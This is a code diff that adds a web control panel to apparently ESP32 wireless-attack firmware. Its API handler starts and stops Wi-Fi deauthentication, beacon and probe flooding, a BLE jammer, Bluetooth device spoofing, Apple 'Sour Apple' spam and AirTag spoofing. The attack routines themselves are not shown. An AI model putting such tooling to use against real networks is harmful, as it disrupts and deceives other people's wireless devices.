+  const el=document.getElementById('modePill');
+  const map={idle:['Idle','idle'],scanning:['Scanning','scanning'],attacking:['Attacking','attacking'],defending:['Defending','defending']};
+  const x=map[m]||map.idle; el.textContent=x[0]; el.className='mode '+x[1];
+}
+function apply(s){
+  S=s||{};
+  setMode(s.mode||'idle');
+  document.getElementById('temp').textContent=(s.temp!=null)?Number(s.temp).toFixed(1):'—';
+  setToggle('btnPm',s.pm); setToggle('btnBeacon',s.beacon); setToggle('btnDeauth',s.deauth);
+  setToggle('btnDet',s.det); setToggle('btnProbe',s.probe); setToggle('btnSpoof',s.spoof);
+  setToggle('btnSour',s.sour); setToggle('btnJam',s.jam); setToggle('btnAir',s.air); setToggle('btnSniff',s.sniff);
+  document.getElementById('wscanBar').style.width=s.wifiScanning?'75%':'0%';
+  document.getElementById('bscanBar').style.width=s.bleScanning?'75%':'0%';
+  document.getElementById('btnWifiScan').textContent=s.wifiScanning?'Scanning…':'Start scan';
+  document.getElementById('btnWifiScan').disabled=!!s.wifiScanning;
+  document.getElementById('btnBleScan').textContent=s.bleScanning?'Scanning…':'Start scan';
+  document.getElementById('btnBleScan').disabled=!!s.bleScanning;
+  document.getElementById('pmTotal').textContent=s.pmTotal||0;
+  document.getElementById('pmChLive').textContent=s.pmCh||1;
+  document.getElementById('beaconSent').textContent=s.beaconSent||0;
+  document.getElementById('deauthSent').textContent=s.deauthSent||0;
+  document.getElementById('detCount').textContent=s.detCount||0;
+  document.getElementById('probeSent').textContent=s.probeSent||0;
+  document.getElementById('jamCount').textContent=s.jamCount||0;
+  document.getElementById('airSent').textContent=s.airSent||0;
+  document.getElementById('sourSent').textContent=s.sourSent||0;
+  document.getElementById('sourName').textContent=s.sourName||'—';
+  document.getElementById('wscanMsg').textContent=s.wifiScanning?'Scanning… keeping previous list until done':((s.wifi&&s.wifi.length)?(s.wifi.length+' networks'):'No networks yet');
+  renderWifi(s.wifi); renderBle(s.ble); fillApple(s.apple);
+}
+async function refresh(){try{const r=await fetch('/api/status');apply(await r.json());}catch(e){}}
+async function act(action,extra){
+  const body=Object.assign({action},extra||{});
+  if(action==='pm_start') body.ch=parseInt(document.getElementById('pmCh').value)||1;
+  if(action==='beacon_start'){
+    body.mode=parseInt(document.getElementById('beaconMode').value)||0;
+    if(body.mode===2){
+      const n=parseInt(document.getElementById('ssidCount').value)||1;
+      const arr=[];
+      for(let i=0;i<n;i++){const v=(document.getElementById('ssid'+i).value||'').trim(); if(v) arr.push(v);}
+      body.list=arr.join('|');
+      body.count=arr.length;
+    }
+  }
+  if(action==='deauth_start' && body.target===undefined) body.target=deauthTarget;
+  if(action==='spoof_start'){body.mode=parseInt(document.getElementById('spoofMode').value)||0;body.name=document.getElementById('spoofName').value||'';}
+  if(action==='sour_start') body.idx=parseInt(document.getElementById('sourIdx').value);
+  try{
+    const r=await fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+    const j=await r.json();
+    document.getElementById('sysMsg').textContent=j.msg||'';
+    if(j.status) apply(j.status);
+  }catch(e){document.getElementById('sysMsg').textContent='Request failed — reconnect to ESP32-1';}
+}
+function toggle(tool){
+  const on={pm:S.pm,beacon:S.beacon,deauth:S.deauth,det:S.det,probe:S.probe,spoof:S.spoof,sour:S.sour,jam:S.jam,air:S.air,sniff:S.sniff}[tool];
+  if(on) act(tool+'_stop'); else act(tool+'_start');
+}
+setInterval(refresh,1500); refresh();
+</script>
+</body></html>
+)HTML";
+
+
+static float readChipTempC() {
+  // Internal sensor; approximate, varies by chip/core version
+  return temperatureRead();
+}
+
+static String jsonStatus() {
+  String j = "{";
+  bool any = pmRunning || beaconRunning || deauthRunning || detRunning ||
+             probeRunning || sniffRunning || spoofRunning || sourRunning ||
+             jamRunning || airTagRunning;
+  const char* mode = "idle";
+  if (wifiScanning || bleScanning || sniffRunning || pmRunning) mode = "scanning";
+  else if (detRunning) mode = "defending";
+  else if (beaconRunning || deauthRunning || probeRunning || spoofRunning ||
+           sourRunning || jamRunning || airTagRunning) mode = "attacking";
+  j += "\"mode\":\""; j += mode; j += "\",";
+  j += "\"any\":"; j += any ? "true," : "false,";
+  j += "\"pm\":"; j += pmRunning ? "true," : "false,";
+  j += "\"beacon\":"; j += beaconRunning ? "true," : "false,";
+  j += "\"deauth\":"; j += deauthRunning ? "true," : "false,";
+  j += "\"det\":"; j += detRunning ? "true," : "false,";
+  j += "\"probe\":"; j += probeRunning ? "true," : "false,";
+  j += "\"spoof\":"; j += spoofRunning ? "true," : "false,";
+  j += "\"sour\":"; j += sourRunning ? "true," : "false,";
+  j += "\"jam\":"; j += jamRunning ? "true," : "false,";
+  j += "\"air\":"; j += airTagRunning ? "true," : "false,";
+  j += "\"sniff\":"; j += sniffRunning ? "true," : "false,";
+  j += "\"wifiScanning\":"; j += wifiScanning ? "true," : "false,";
+  j += "\"bleScanning\":"; j += bleScanning ? "true," : "false,";
+  j += "\"pmTotal\":" + String((unsigned long)pktTotal) + ",";
+  j += "\"pmCh\":" + String(pmChannel) + ",";
+  j += "\"beaconSent\":" + String((unsigned long)beaconSent) + ",";
+  j += "\"deauthSent\":" + String((unsigned long)deauthSent) + ",";
+  j += "\"detCount\":" + String((unsigned long)deauthCount) + ",";
+  j += "\"probeSent\":" + String((unsigned long)probeSent) + ",";
+  j += "\"jamCount\":" + String((unsigned long)jamCount) + ",";
+  j += "\"airSent\":" + String((unsigned long)airTagSent) + ",";
+  j += "\"sourSent\":" + String((unsigned long)sourSent) + ",";
+  j += "\"temp\":" + String(readChipTempC(), 1) + ",";
+  j += "\"uptime\":" + String((unsigned long)millis()) + ",";
+  j += "\"clients\":" + String((unsigned)WiFi.softAPgetStationNum()) + ",";
+  j += "\"heap\":" + String((unsigned long)ESP.getFreeHeap()) + ",";
+  {
+    String sn = "—";
+    if (sourRunning) {
+      if (sourSelected < 0) sn = "Random Mix";
+      else if (sourSelected < APPLE_LIST_COUNT) sn = appleList[sourSelected].name;
+    }
+    sn.replace("\"", "'");
+    j += "\"sourName\":\"" + sn + "\",";
+  }
+  j += "\"apple\":[";
+  for (int i = 0; i < APPLE_LIST_COUNT; i++) {
+    if (i) j += ",";
+    String n = appleList[i].name; n.replace("\"", "'");
+    j += "\"" + n + "\"";
+  }
+  j += "],\"wifi\":[";
+  for (int i = 0; i < wifiCount; i++) {
+    if (i) j += ",";
+    String s = wifiNets[i].ssid; s.replace("\"", "'");
+    char bssid[18];
+    snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
+             wifiNets[i].bssid[0], wifiNets[i].bssid[1], wifiNets[i].bssid[2],
+             wifiNets[i].bssid[3], wifiNets[i].bssid[4], wifiNets[i].bssid[5]);
+    const char* encStr = "Open";
+    switch (wifiNets[i].enc) {
+      case WIFI_AUTH_OPEN: encStr = "Open"; break;
+      case WIFI_AUTH_WEP: encStr = "WEP"; break;
+      case WIFI_AUTH_WPA_PSK: encStr = "WPA"; break;
+      case WIFI_AUTH_WPA2_PSK: encStr = "WPA2"; break;
+      case WIFI_AUTH_WPA_WPA2_PSK: encStr = "WPA/WPA2"; break;
+      case WIFI_AUTH_WPA2_ENTERPRISE: encStr = "WPA2-E"; break;
+      case WIFI_AUTH_WPA3_PSK: encStr = "WPA3"; break;
+      case WIFI_AUTH_WPA2_WPA3_PSK: encStr = "WPA2/WPA3"; break;
+      default: encStr = "Secured"; break;
+    }
+    j += "{\"ssid\":\"" + s + "\",\"rssi\":" + String(wifiNets[i].rssi) +
+         ",\"ch\":" + String(wifiNets[i].ch) + ",\"bssid\":\"" + String(bssid) +
+         "\",\"enc\":\"" + String(encStr) + "\",\"open\":" +
+         ((wifiNets[i].enc == WIFI_AUTH_OPEN) ? "true" : "false") + "}";
+  }
+  j += "],\"ble\":[";
+  for (int i = 0; i < bleCount; i++) {
+    if (i) j += ",";
+    String n = bleDevs[i].name; n.replace("\"", "'");
+    String a = bleDevs[i].addr; a.replace("\"", "'");
+    j += "{\"name\":\"" + n + "\",\"addr\":\"" + a + "\",\"rssi\":" + String(bleDevs[i].rssi) + "}";
+  }
+  j += "]}";
+  return j;
+}
+
+static void handleWebRoot() { webServer.send_P(200, "text/html", WEB_PAGE); }
+static void handleWebStatus() { webServer.send(200, "application/json", jsonStatus()); }
+
+static void handleWebApi() {
+  String body = webServer.arg("plain");
+  String action;
+  int mode = 0, target = -1, ch = 1, idx = -1;
+  String customName;
+
+  int ai = body.indexOf("\"action\"");
+  if (ai >= 0) {
+    int q1 = body.indexOf('"', ai + 8);
+    int q2 = body.indexOf('"', q1 + 1);
+    if (q1 >= 0 && q2 > q1) action = body.substring(q1 + 1, q2);
+  }
+  auto parseIntAfter = [&](const char* key, int defv) -> int {
+    int k = body.indexOf(key);
+    if (k < 0) return defv;
+    int c = k + (int)strlen(key);
+    while (c < (int)body.length() && (body[c] < '0' || body[c] > '9') && body[c] != '-') c++;
+    return (int)body.substring(c).toInt();
+  };
+  mode = parseIntAfter("\"mode\"", 0);
+  target = parseIntAfter("\"target\"", -1);
+  ch = parseIntAfter("\"ch\"", 1);
+  idx = parseIntAfter("\"idx\"", -1);
+  if (ch < 1 || ch > 13) ch = 1;
+  {
+    int ni = body.indexOf("\"name\"");
+    if (ni >= 0) {
+      int q1 = body.indexOf('"', ni + 6);
+      int q2 = body.indexOf('"', q1 + 1);
+      if (q1 >= 0 && q2 > q1) customName = body.substring(q1 + 1, q2);
+    }
+  }
+
+  String msg = "OK";
+  if (action == "stop_all") { stopAllTools(); msg = "All tools stopped"; }
+  else if (action == "exit_web") { webExitRequested = true; msg = "Exiting web mode"; }
+  else if (action == "wifi_scan") {
+    if (webMode) {
+      WiFi.mode(WIFI_AP_STA);
+      WiFi.softAP("ESP32-1", "rgisking");
+      delay(40);
+    }
+    wifiScanStart();
+    msg = wifiScanning ? "Wi-Fi scan started" : "Scan failed to start";
+  }
+  else if (action == "pm_start") { stopAllTools(); pmChannel = ch; pmStart(); msg = "Packet monitor CH" + String(ch); }
+  else if (action == "pm_stop") { pmStop(); msg = "PM stopped"; }
+  else if (action == "beacon_start") {
+    stopAllTools();
+    beaconMode = (uint8_t)mode;
+    if (beaconMode == 2) {
+      customBeaconCount = 0;
+      customBeaconIdx = 0;
+      int li = body.indexOf("\"list\"");
+      String listStr;
+      if (li >= 0) {
+        int q1 = body.indexOf('"', li + 6);
+        int q2 = body.indexOf('"', q1 + 1);
+        if (q1 >= 0 && q2 > q1) listStr = body.substring(q1 + 1, q2);
+      }
+      int start = 0;
+      while (start < (int)listStr.length() && customBeaconCount < 10) {
+        int pipe = listStr.indexOf('|', start);
+        String part = (pipe < 0) ? listStr.substring(start) : listStr.substring(start, pipe);
+        part.trim();
+        if (part.length() > 0) {
+          if (part.length() > 32) part = part.substring(0, 32);
+          strncpy(customBeaconSSIDs[customBeaconCount], part.c_str(), 32);
+          customBeaconSSIDs[customBeaconCount][32] = 0;
+          customBeaconCount++;
+        }
+        if (pipe < 0) break;
+        start = pipe + 1;
+      }
+      if (customBeaconCount == 0) {
+        msg = "Add at least one SSID";
+        webServer.send(200, "application/json",
+          String("{\"msg\":\"") + msg + "\",\"status\":" + jsonStatus() + "}");
+        return;
+      }
+    }
+    beaconStart();
+    msg = "Beacon started";
+  }
+  else if (action == "beacon_stop") { beaconStop(); msg = "Beacon stopped"; }
+  else if (action == "deauth_start") {
+    stopAllTools();
+    if (target < 0) deauthStartAll();
+    else deauthStart(target);
+    msg = "Deauth started";
+  }
+  else if (action == "deauth_stop") { deauthStop(); msg = "Deauth stopped"; }
+  else if (action == "det_start") { stopAllTools(); detStart(); msg = "Detector started"; }
+  else if (action == "det_stop") { detStop(); msg = "Detector stopped"; }
+  else if (action == "probe_start") { stopAllTools(); probeStart(); msg = "Probe started"; }
+  else if (action == "probe_stop") { probeStop(); msg = "Probe stopped"; }
+  else if (action == "ble_scan") {
+    sniffStop(); spoofStop(); sourStop(); jamStop(); airTagStop();
+    bleScanStart();
+    msg = "BLE scan started (4s)";
+  }
+  else if (action == "sniff_start") { spoofStop(); sourStop(); jamStop(); airTagStop(); sniffStart(); msg = "Sniff started"; }
+  else if (action == "sniff_stop") { sniffStop(); msg = "Sniff stopped"; }
+  else if (action == "spoof_start") {
+    sniffStop(); sourStop(); jamStop(); airTagStop();
+    spoofMode = (uint8_t)mode;
+    if (customName.length()) spoofCustomName = customName;
+    spoofStart();
+    msg = "Spoofer started";
+  }
+  else if (action == "spoof_stop") { spoofStop(); msg = "Spoofer stopped"; }
+  else if (action == "sour_start") {
+    sniffStop(); spoofStop(); jamStop(); airTagStop();
+    sourSelected = idx;  // -1 = random
+    sourStart();
+    sourBeginAdvertise();
+    msg = "Sour Apple started";
+  }
+  else if (action == "sour_stop") { sourStop(); msg = "Sour Apple stopped"; }
+  else if (action == "jam_start") { sniffStop(); spoofStop(); sourStop(); airTagStop(); jamStart(); msg = "Jammer started"; }
+  else if (action == "jam_stop") { jamStop(); msg = "Jammer stopped"; }
+  else if (action == "air_start") { sniffStop(); spoofStop(); sourStop(); jamStop(); airTagBeginSpoof(); msg = "AirTag spoof started"; }
+  else if (action == "air_stop") { airTagStop(); msg = "AirTag stopped"; }
+  else msg = "Unknown action";
+
+  webServer.send(200, "application/json",
+    String("{\"msg\":\"") + msg + "\",\"status\":" + jsonStatus() + "}");
+}
+
+
+static void drawWebModeScreen() {
+  tft.fillScreen(COL_BG);
+  Theme::drawStatusBar("WEB MODE");
+  Theme::printCentered("Soft-AP active", 28, COL_OK, 1);
+  Theme::printCentered("SSID: ESP32-1", 48, COL_FG, 1);
+  Theme::printCentered("Pass: rgisking", 64, COL_FG, 1);
+  Theme::printCentered("http://192.168.4.1", 84, COL_ACCENT, 1);
+  Theme::drawFooter("LED ON", "Hold BOOT=Exit");
+}
+
+static void setupWebRoutes() {
+  webServer.stop();
+  webServer.on("/", HTTP_GET, handleWebRoot);
+  webServer.on("/api/status", HTTP_GET, handleWebStatus);
+  webServer.on("/api", HTTP_POST, handleWebApi);
+  webServer.onNotFound(handleWebRoot);
+  webServer.begin();
+}
+
+static void enterWebMode() {
+  if (webMode) return;
+  stopAllTools();
+  webMode = true;
+  webExitRequested = false;
+  digitalWrite(STATUS_LED, HIGH);
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP("ESP32-1", "rgisking");
+  delay(150);
+  setupWebRoutes();
+  drawWebModeScreen();
+  Serial.println("[WEB] Soft-AP ESP32-1 / rgisking -> http://192.168.4.1");
+}
+
+static void exitWebMode() {
+  if (!webMode) return;
+  stopAllTools();
+  webServer.stop();
+  WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_STA);
+  digitalWrite(STATUS_LED, LOW);
+  webMode = false;
+  webExitRequested = false;
+  bootHoldStart = 0;
+  bootWasDown = false;
+  Serial.println("[WEB] Exited Soft-AP mode");
+}
+
+static void handleWebClients() {
+  if (!webMode) return;
+  webServer.handleClient();
+  if (webExitRequested) exitWebMode();
+}
+
+
 // ============================================================
 //  UI
 // ============================================================
@@ -1026,6 +1811,10 @@ const char* const UI::BLE_ITEMS[] = {
 const int UI::BLE_COUNT = 7;
 
 void UI::begin() {
+  pinMode(BOOT_BTN, INPUT_PULLUP);
+  pinMode(STATUS_LED, OUTPUT);
+  digitalWrite(STATUS_LED, LOW);
+
   Theme::init();
   joystick.begin();
   wifiScanBegin();
@@ -1572,6 +2361,52 @@ void UI::drawCurrent() {
 }
 
 void UI::loop() {
+  // ---- BOOT button (GPIO0) hold 2s toggles Soft-AP web mode ----
+  bool bootDown = (digitalRead(BOOT_BTN) == LOW);
+  if (bootDown) {
+    if (!bootWasDown) {
+      bootWasDown = true;
+      bootHoldStart = millis();
+    } else if (bootHoldStart && (millis() - bootHoldStart >= 2000)) {
+      bootHoldStart = 0;  // fire once per hold
+      if (webMode) {
+        exitWebMode();
+        _screen = SCR_MAIN;
+        _sel = 0; _top = 0; _dirty = true;
+        drawCurrent();
+      } else {
+        enterWebMode();
+      }
+    }
+  } else {
+    bootWasDown = false;
+    bootHoldStart = 0;
+  }
+
+  if (webMode) {
+    // Keep tool updates alive so web-started tools work
+    wifiScanUpdate();
+    bleScanUpdate();
+    pmUpdate();
+    beaconUpdate();
+    detUpdate();
+    deauthUpdate();
+    probeUpdate();
+    sniffUpdate();
+    spoofUpdate();
+    sourUpdate();
+    jamUpdate();
+    airTagUpdate();
+    handleWebClients();
+    // If exit was requested from web UI
+    if (!webMode) {
+      _screen = SCR_MAIN;
+      _sel = 0; _top = 0; _dirty = true;
+      drawCurrent();
+    }
+    return;  // skip joystick UI while web mode is active
+  }
+
   joystick.update();
   wifiScanUpdate();
   bleScanUpdate();
